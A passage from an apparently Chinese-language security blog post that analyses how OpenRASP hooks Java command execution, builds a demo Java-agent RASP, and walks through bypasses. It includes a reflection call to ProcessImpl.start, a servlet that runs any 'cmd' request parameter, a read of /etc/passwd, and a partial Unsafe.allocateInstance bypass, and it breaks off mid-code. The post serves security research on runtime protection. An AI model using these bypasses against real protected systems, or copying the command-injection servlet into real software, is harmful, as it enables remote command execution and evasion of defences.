class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为业务大于安全的考录，熔断开关在许多的RASP产品都可以进行设置。因此有师傅提到也许可以通过DDOS，让CPU高负载，使用率超过90%，从而禁用全部hook点。当云控注册成功之前，不进入任何hook点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Config.getConfig().getCloudSwitch() &amp;&amp; Config.getConfig().getHookWhiteAll()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后走到com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest，在这里，首先判断RASP开关是否打开，即对<code>enableHook.get()</code>作判断。之后，做了一些参数的封装，以及失败日志、耗时日志等输出，并且在检测到攻击时（下一层返回），抛出异常：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doRealCheckWithoutRequest</span><span class="params">(CheckParameter.Type type, Map params)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (enableHook.get()) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">            <span class="keyword">if</span> (Config.getConfig().getDebugLevel() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                a = System.currentTimeMillis();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isBlock</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="type">CheckParameter</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CheckParameter</span>(type, params);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                isBlock = CheckerManager.check(type, parameter);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var12) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;plugin check error: &quot;</span> + var12.getClass().getName() + <span class="string">&quot; because: &quot;</span> + var12.getMessage();</span><br><span class="line">                <span class="type">AbstractRequest</span> <span class="variable">request</span> <span class="operator">=</span> (AbstractRequest)requestCache.get();</span><br><span class="line">                <span class="keyword">if</span> (request != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">StringBuffer</span> <span class="variable">url</span> <span class="operator">=</span> request.getRequestURL();</span><br><span class="line">                    <span class="keyword">if</span> (!StringUtils.isEmpty(url)) &#123;</span><br><span class="line">                        msg = url + <span class="string">&quot; &quot;</span> + msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                LogTool.error(ErrorType.PLUGIN_ERROR, msg, var12);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (a &gt; <span class="number">0L</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t</span> <span class="operator">=</span> System.currentTimeMillis() - a;</span><br><span class="line">                <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;type=&quot;</span> + type.getName() + <span class="string">&quot; &quot;</span> + <span class="string">&quot;time=&quot;</span> + t;</span><br><span class="line">                <span class="keyword">if</span> (requestCache.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">                    LOGGER.info(<span class="string">&quot;request_id=&quot;</span> + ((AbstractRequest)requestCache.get()).getRequestId() + <span class="string">&quot; &quot;</span> + message);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    LOGGER.info(message);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isBlock) &#123;</span><br><span class="line">                handleBlock(parameter);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接着执行到com.baidu.openrasp.plugin.checker.CheckerManager#check：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(CheckParameter.Type type, CheckParameter parameter)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ((Checker)checkers.get(type)).check(parameter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里根据传入的type来选择调用相对应的checkers的check方法，假设此时的checker是V8AttackChecker，那么就会调用com.baidu.openrasp.plugin.checker.AbstractChecker#check：</p><p><a href="https://pic.imgdb.cn/item/64cfd7081ddac507cc85f97b.jpg" title="image-20230806145906724" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7081ddac507cc85f97b.jpg" alt="image-20230806145906724"></a></p><p>调用了相应checker的checkParam方法，那我们看看com.baidu.openrasp.plugin.checker.v8.V8AttackChecker#checkParam：</p><p><a href="https://pic.imgdb.cn/item/64cfd7131ddac507cc860fd6.jpg" title="image-20230806145936500" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7131ddac507cc860fd6.jpg" alt="image-20230806145936500"></a></p><p>继续跟进com.baidu.openrasp.plugin.js.JS#Check：</p><p><a href="https://pic.imgdb.cn/item/64cfd71e1ddac507cc8629ae.jpg" title="image-20230806150051302" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd71e1ddac507cc8629ae.jpg" alt="image-20230806150051302"></a></p><p>箭头指向的地方即是调用JS插件进行检测的地方了。</p><h2 id="Demo-RASP实现"><a href="#Demo-RASP实现" class="headerlink" title="Demo RASP实现"></a>Demo RASP实现</h2><p>众所周知，常见的Runtime.getRuntime().exec()执行命令的底层逻辑是通过ProcessBuilder的start方法去执行命令的，而ProcessBuilder执行命令实际上也是调用了ProcessImpl这个类的start方法。那我们如果想防止这种命令执行的话，就需要在ProcessImpl处进行hook。我们先来看看OpenRASP是怎么做的，首先看看如何匹配类的：</p><p><a href="https://pic.imgdb.cn/item/64cfd7291ddac507cc8643bb.jpg" title="image-20230806135243062" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7291ddac507cc8643bb.jpg" alt="image-20230806135243062"></a></p><p>先判断java版本，如果大于等于1.9则对<code>java/lang/ProcessImpl</code>进行hook，这是因为在JDK9的时候把<code>UNIXProcess</code>合并到了<code>ProcessImpl</code>当中，参考<a href="https://hg.openjdk.org/jdk-updates/jdk9u/jdk/rev/98eb910c9a97">https://hg.openjdk.org/jdk-updates/jdk9u/jdk/rev/98eb910c9a97</a>。之后如果小于1.9继续判断，如果是Windows操作系统，则对<code>java/lang/ProcessImpl</code>进行hook，否则对java&#x2F;lang&#x2F;UNIXProcess进行hook。我们继续看看插入的代码：</p><p><a href="https://pic.imgdb.cn/item/64cfd7341ddac507cc8657eb.jpg" title="image-20230806135850824" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7341ddac507cc8657eb.jpg" alt="image-20230806135850824"></a></p><p>根据相应的逻辑在ProcessImpl类的初始化方法或者UNIXProcess类的初始化方法中插入相应的<code>checkCommand</code>方法。现在我先来给大家写一个Demo RASP，并给出其相应bypass方法。首先给出实现了premain方法的PreMainDemo类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PreMainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> IOException, UnmodifiableClassException &#123;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br><span class="line"></span><br><span class="line">        addJarToBootstrap(inst);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Class aClass : classes) &#123;</span><br><span class="line"><span class="comment">//            System.out.println(aClass);</span></span><br><span class="line">            <span class="keyword">if</span> (aClass.getName().contains(<span class="string">&quot;ProcessBuilder&quot;</span>) &amp;&amp; inst.isModifiableClass(aClass))&#123;</span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TransformerDemo</span>(),<span class="literal">true</span>);</span><br><span class="line">                inst.retransformClasses(aClass);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getLocalJarPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">localUrl</span> <span class="operator">=</span> PreMainDemo.class.getProtectionDomain().getCodeSource().getLocation();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            path = URLDecoder.decode(localUrl.getFile().replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;%2B&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var3) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;[OpenRASP] Failed to get jarFile path.&quot;</span>);</span><br><span class="line">            var3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addJarToBootstrap</span><span class="params">(Instrumentation inst)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">localJarPath</span> <span class="operator">=</span> getLocalJarPath();</span><br><span class="line">        inst.appendToBootstrapClassLoaderSearch(<span class="keyword">new</span> <span class="title class_">JarFile</span>(localJarPath));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是ClassFileTransformer的实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="literal">null</span>;</span><br><span class="line">        className = className.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> cp.get(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">                CtMethod[] methods = ctClass.getMethods();</span><br><span class="line">                <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> <span class="string">&quot;    System.out.println(\&quot;Get Out!Hacker!\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    return null;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span> (CtMethod method : methods) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;start&quot;</span>)) &#123;</span><br><span class="line">                        method.insertBefore(source);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                bytes = ctClass.toBytecode();</span><br><span class="line">                ctClass.detach();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">//                e.printStackTrace();</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个Demo非常的简单，与OpenRASP类似，都是将agent.jar添加到BootstrapClassloader，但是因为我们这个Demo并不在BootstrapClassloader加载的类中添加调用agent.jar的代码，因此在这个Demo中这部分可以忽略。之后我们还new了一个ProcessBuilder类，因为如果不创建这个实例的话，inst.getAllLoadedClasses()中将没有这个类。之后我们<strong>无脑</strong>对ProcessBuilder类的start方法添加了两行代码，首先输出Get Out!Hacker!，之后return。为什么说是无脑呢？因为我们这样做，会使得正常的命令执行的需求都被屏蔽了，而且hook的是ProcessBuilder类而非ProcessImpl类，为什么hook的是ProcessBuilder就有问题呢？接下来我来给大家做个演示，再来写一个执行命令的类来模拟黑客攻击：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;mate-calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一行很简单的弹计算器的代码，之后我们添加VM Options，添加<code>-javaagent</code>为我们刚刚打包好的Demo.jar：</p><p><a href="https://pic.imgdb.cn/item/64cfd7411ddac507cc867270.jpg" title="image-20230806141750369" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7411ddac507cc867270.jpg" alt="image-20230806141750369"></a></p><p>之后运行，结果如下：</p><p><a href="https://pic.imgdb.cn/item/64cfd74f1ddac507cc868ffb.jpg" title="image-20230806141939188" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd74f1ddac507cc868ffb.jpg" alt="image-20230806141939188"></a></p><p>没有弹出计算器，执行到ProcessBuilder的start方法后输出Get Out!Hacker!并返回了，因此并没有成功执行命令。那我们换一种方法，因为Runtime.getRuntime().exec()的底层就是调用ProcessBuilder的start方法，那我们直接利用ProcessBuilder的start方法执行命令试试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">command</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>().command(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;mate-calc&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> command.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依然符合预期：</p><p><a href="https://pic.imgdb.cn/item/64cfd75a1ddac507cc86a5be.jpg" title="image-20230806142227583" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd75a1ddac507cc86a5be.jpg" alt="image-20230806142227583"></a></p><p>但是请注意，我们刚刚提到了，Runtime.getRuntime().exec()执行命令的底层逻辑是通过ProcessBuilder去执行命令的，而ProcessBuilder执行命令实际是调用了ProcessImpl这个类。那假如我们直接使用ProcessImpl类的start方法去执行命令，是不是就能绕过了？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;mate-calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">e</span> <span class="operator">=</span> (Process) method.invoke(<span class="literal">null</span>, cmds, <span class="literal">null</span>, <span class="string">&quot;.&quot;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功bypass：</p><p><a href="https://pic.imgdb.cn/item/64cfd7661ddac507cc86bfe0.jpg" title="image-20230806142428935" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7661ddac507cc86bfe0.jpg" alt="image-20230806142428935"></a></p><p><strong>从这里我们就可以发现，如果我们要写一个针对某种漏洞的RASP，就必需将这种漏洞的底层原理搞清楚。否则就像上面提到的例子，绕过是很轻松的。</strong>这一点就与WAF有很大差别，WAF可能只需要对一些关键字进行过滤即可防御攻击，但是RASP却不行。</p><p>我们刚刚写这个Demo RASP的时候还遇到了一个问题，那就是我们过滤的时候直接将所有的命令都给屏蔽了。可是我们很多时候又确实有执行命令的需求，那对于这一点我们该怎么做呢？我们先看看万能的OpenRASP是怎么做的：</p><p><a href="https://pic.imgdb.cn/item/64cfd7721ddac507cc86db09.jpg" title="image-20230806172951560" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7721ddac507cc86db09.jpg" alt="image-20230806172951560"></a></p><p>OpenRASP通过黑名单的方式对部分命令进行了正则过滤，可是很明显，这样做仍然很不安全，最大原因就是黑名单的命令不够完备，攻击者很轻松就可以绕过。这里又引出一个问题，如果继续完善黑名单，会耗费巨大的人力不说，还会使得应用的性能严重下降。那如果采用白名单呢？如果我们想执行什么命令，就对此命令加白，似乎又显得非常麻烦。因为本人水平所致，没有办法给出既能使得性能下降不明显，又能使防御能力大幅度上升的做法。不过笔者更倾向白名单的方式对命令进行过滤。</p><h2 id="Bypass-OpenRASP"><a href="#Bypass-OpenRASP" class="headerlink" title="Bypass OpenRASP"></a>Bypass OpenRASP</h2><h3 id="Unsafe绕过"><a href="#Unsafe绕过" class="headerlink" title="Unsafe绕过"></a>Unsafe绕过</h3><p>首先设置44行的all_log为false，即关闭观察模式：</p><p><a href="https://pic.imgdb.cn/item/64cfd7801ddac507cc86f61d.jpg" title="image-20230806200227925" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7801ddac507cc86f61d.jpg" alt="image-20230806200227925"></a></p><p>之后将命令注入模块的action由log改为block，此时我们就打开了拦截模式：</p><p><a href="https://pic.imgdb.cn/item/64cfd7891ddac507cc870802.jpg" title="image-20230806200209175" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7891ddac507cc870802.jpg" alt="image-20230806200209175"></a></p><p>我们先写一个HttpServlet，其中doGet方法为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> ((a=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">    byteArrayOutputStream.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">out.println(<span class="keyword">new</span> <span class="title class_">String</span>(byteArrayOutputStream.toByteArray()));</span><br></pre></td></tr></table></figure><p>传入cmd参数为whoami，以下是结果：</p><p><a href="https://pic.imgdb.cn/item/64cfd7961ddac507cc872447.jpg" title="image-20230806200633686" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7961ddac507cc872447.jpg" alt="image-20230806200633686"></a></p><p>符合预期，按照正则表达式没有进行过滤。之后传入cmd&#x3D;cat &#x2F;etc&#x2F;passwd，结果为：</p><p><a href="https://pic.imgdb.cn/item/64cfd7a11ddac507cc873e11.jpg" title="image-20230806200744779" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7a11ddac507cc873e11.jpg" alt="image-20230806200744779"></a></p><p>接下来我们尝试bypass。在bypass之前，我们再回想一下OpenRASP的hook流程？比如这里提到的命令执行部分，OpenRASP在UNIXProcess或者ProcessImpl类的初始化方法处插入了自己的防御代码，使得我们无法执行黑名单中的命令。那麻烦思考一下，既然它在UNIXProcess或者ProcessImpl类的初始化方法中插入了防御代码，那么我们有没有一种办法能够不需要调用这两个类的初始化方法就能直接获取UNIXProcess或者ProcessImpl类呢？当然是有的，在Java中有一个叫Unsafe的类，它提供了非常底层的<code>内存、CAS、线程调度、类、对象</code>等操作、<code>Unsafe</code>正如它的名字一样它提供的几乎所有的方法都是不安全的。而Unsafe类中有一个allocateInstance方法，它可以无视构造方法从而直接创建这个类的实例。接下来给大家做个示范：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] commands = request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="comment">//反射获取unsafe实例</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取UNIXProcess实例</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> 